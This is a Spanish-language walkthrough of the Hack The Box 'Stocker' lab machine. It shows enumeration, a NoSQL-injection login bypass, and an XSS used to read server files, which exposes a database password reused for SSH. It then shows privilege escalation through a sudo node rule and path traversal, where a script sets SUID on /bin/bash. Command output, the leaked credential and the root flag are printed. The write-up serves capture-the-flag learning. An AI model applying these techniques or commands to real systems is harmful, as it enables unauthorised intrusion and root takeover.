Hoy estaremos realizando la maquina stocker de dificultad facil de la plataforma de Hack The Box
![](/assets/img/stocker/machine.png)

## Enumeracion
Empezemos haciendo un escaneo de puertos a la maquina victima
```bash
❯ nmap 10.10.11.196
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 14:56 -05
Nmap scan report for stocker.htb (10.10.11.196)
Host is up (0.095s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.19 seconds
```
Intentemos dectectar la version que corre en estos puertos
```bash
❯ nmap -sCV -p22,80 10.10.11.196 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 14:58 -05
Nmap scan report for stocker.htb (10.10.11.196)
Host is up (0.093s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-generator: Eleventy v2.0.0
|_http-title: Stock - Coming Soon!
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Solo tenemos 2 puertos ssh y http, si enviamos una peticion con curl al servidor  y vemos las cabezeras de respuesta observamos que hay un redirect a un dominio
```bash
❯ curl -s http://10.10.11.196 -I |grep 'Location'
Location: http://stocker.htb
```
Agreguemos este dominio al /etc/hosts para que nuestra maquina sepa a que ip tiene que resolver este dominio
```bash
❯ echo '10.10.11.196 stocker.htb' >> /etc/hosts
```
Esta es la web
![](/assets/img/stocker/web.png)
En la parte inferior de la web hay un comentario interesante el cual nos habla de que hay otro sitio web esto puede ser una pista, como tenemos un dominio intentemos buscar por subdominios.
```bash
❯ gobuster vhost -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://stocker.htb/ --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://stocker.htb/
[+] Method:       GET
[+] Threads:      200
[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/02/20 15:11:43 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb (Status: 302) [Size: 28]
                                               
===============================================================
2023/02/20 15:11:46 Finished
===============================================================
```
Encontramos uno dev.stocker.htb incorporemos este subdominio al /etc/hosts y veamos si el contenido de la web es diferente a dominio principal
```bash
❯ echo '10.10.11.196 dev.stocker.htb' >> /etc/hosts
```
Al ingresar al subdominio podemos ver que hay una redirecion a /login
![](/assets/img/stocker/sub.png)

## login bypass
Despues de estar un rato intentando Inyecciones Sql no pude hacer nada pero todavia me faltaba probar las inyecciones no Sql para esto me dirigi a [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) y voy a interceptar la peticion con burpsuite para hacer algunas pruebas, Si intentamos una inyeccion basica no nos va a funcionar pero si tramitamos la peticion en json logramos bypassear el login
![](/assets/img/stocker/burp.png)

## Explotacion
En la web vemos que es un sitio de compra de articulos si agregamos un articulo al carrito y le damos en enviar compra, lo interceptamos con burpsuite y estan viajando estos campos al enviar la peticion nos devuelve un identificador el cual para ver su contenido hay que ponerlo en la url http://dev.stocker.htb/api/po/<identificador\>
![](/assets/img/stocker/cart.png)
Si en la peticion cambiamos el title por etiquetas html <h1>hola</h1> El servidor me las interpreta correctamente.
![](/assets/img/stocker/hola.png)
Por alguna razon al momento de probar un xss el servidor peta y me devuelve un 501(Internal Server Error) por lo que quiero pensar que puede ser vulnerable a un xss buscando por internet me encontre con este [articulo](https://blog.dixitaditya.com/xss-to-read-internal-files) donde explican como atraves de un xss podemos leer archivos internos de la maquina probemos aver si esto funciona.
![](/assets/img/stocker/pass.png)
Ingresamos con el identificador a la web y vemos el /etc/passwd de la maquina victima e identificamos un usuario angoose.
![](/assets/img/stocker/etc.png)
Vale tenemos una via para leer archivos de la maquina, si metemos caracteres de mas para que el servidor pete vemos que nos muestra la ruta donde esta montado el servidor web /var/www/dev/
![](/assets/img/stocker/error.png)
veamos el index.js de la pagina web
![](/assets/img/stocker/index.png)
Al ver el contenido de este archivo en la web hay credenciales de acceso a la base de datos
```bash
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```
Veamos si estas credenciales se reutilizan para el usuario angoose que indentificamos al ver el /etc/passwd de la maquina victima.

Y funciona
```bash
❯ sshpass -p 'IHeardPassphrasesArePrettySecure' ssh angoose@10.10.11.196

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$ whoami
angoose
angoose@stocker:~$ 
```
## Escalada De Privilegios
Si vemos los privilegios que tenemos a nivel de sudoers tenemos el privilegio de ejecutar node como cualquier usuario podemos aprovecharnos de esto para escalar privilegios.
```bash
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```
En la ruta que nos da no tenemos capacidad de escritura pero esto no es necesario ya que podemos aplicar un Path Traversal para ejecutar un archivo que se encuentre una ruta totalmente diferente.

Para esto cree un archivo .js atraves del cual poder ejecutar comandos
```bash
angoose@stocker:/tmp$ cat sh.js 
const { exec } = require('child_process');

function runCommand(command) {
  exec(command, (error, stdout, stderr) => {
    if (error) {
      return;
    }
    console.log(`${stdout}`);
  });
}

runCommand('chmod u+s /bin/bash')
angoose@stocker:/tmp$ 
```
Ejecutamos el script y funciono
```bash
angoose@stocker:/tmp$ sudo node /usr/local/scripts/../../../tmp/sh.js

angoose@stocker:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
angoose@stocker:/tmp$ 
```
Ya podemos migrar al usuario root con el privilegio que le dimos a la bash
```bash
angoose@stocker:/tmp$ bash -p
bash-5.0# cat /root/root.txt 
4416100c503c1d819bf0999da1a0cff1
bash-5.0# 
```
Gracias por leer